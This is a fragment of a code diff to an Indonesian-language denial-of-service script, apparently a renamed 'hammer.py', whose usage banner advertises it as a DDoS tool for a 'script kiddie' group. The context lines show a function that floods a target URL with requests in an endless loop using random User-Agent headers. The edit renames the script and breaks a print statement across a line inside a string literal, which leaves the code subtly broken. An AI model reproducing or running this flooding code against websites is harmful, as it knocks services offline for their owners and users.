@@ -35,7 +35,8 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94mnggarap
+...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -78,7 +79,7 @@ def usage():
 	print (''' \033[92m	Tools DDoS Khusus Grup Script Kidde.
         Grup Koplak, Wes ngono ae.
         Gass Kan DDoS Website. \n
-	Penggunaan: python hammer.py -s (IP website) -p (80) -t (bebas asal sopan)
+	Penggunaan: python ddos.py -s (IP website) -p (80) -t (bebas asal sopan)
 	NOTE: Tanpa Tanda Kurung :v
 	-s : server ip
 	-p : port default 80
